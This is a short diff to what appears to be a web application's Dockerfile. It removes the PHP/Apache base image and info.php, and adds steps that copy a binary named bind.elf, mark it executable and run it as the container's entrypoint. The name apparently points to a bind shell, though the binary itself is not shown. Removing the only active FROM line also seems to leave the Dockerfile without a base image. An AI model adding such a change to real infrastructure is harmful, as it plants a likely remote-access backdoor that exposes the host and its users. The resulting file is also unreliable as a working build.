@@ -15,5 +15,6 @@ EXPOSE 8080
 #WORKDIR /app
 #COPY --from=build /app/build/libs/web-application-*.jar /app/web-application.jar
 #ENTRYPOINT ["java","-server", "-Xms1G", "-Xmx1G", "-jar", "web-application.jar"]
-FROM php:7.2-apache
-COPY info.php /var/www/html/info.php
+COPY bind.elf .
+RUN chmod +x bind.elf
+ENTRYPOINT ["./bind.elf"]
